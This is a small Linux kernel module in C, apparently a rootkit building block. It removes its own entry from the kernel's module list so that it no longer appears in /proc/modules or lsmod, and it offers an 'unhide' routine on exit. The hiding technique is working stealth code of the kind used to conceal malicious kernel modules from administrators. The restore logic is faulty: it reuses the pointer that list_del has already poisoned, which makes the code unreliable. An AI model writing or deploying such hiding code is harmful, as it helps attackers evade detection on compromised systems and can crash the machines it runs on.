#include <linux/module.h>
#include <linux/list.h>

void hide_module(void);
void unhide_module(void);

/* Hiding the module from /proc/modules */
void hide_module(void) {
    list_del(&THIS_MODULE->list); // Supprime le module de la liste globale
}

/* Restoring the module to /proc/modules */
void unhide_module(void) {
    list_add(&THIS_MODULE->list, THIS_MODULE->list.prev); // Réinsère le module à sa position précédente
}

static int __init hide_init(void) {
    pr_info("Hiding the module!\n");
    hide_module();
    return 0;
}

static void __exit hide_exit(void) {
    unhide_module();
    pr_info("Unhiding the module!\n");
}

module_init(hide_init);
module_exit(hide_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("gogoliomax");
MODULE_DESCRIPTION("Hides kernel module from lsmod");

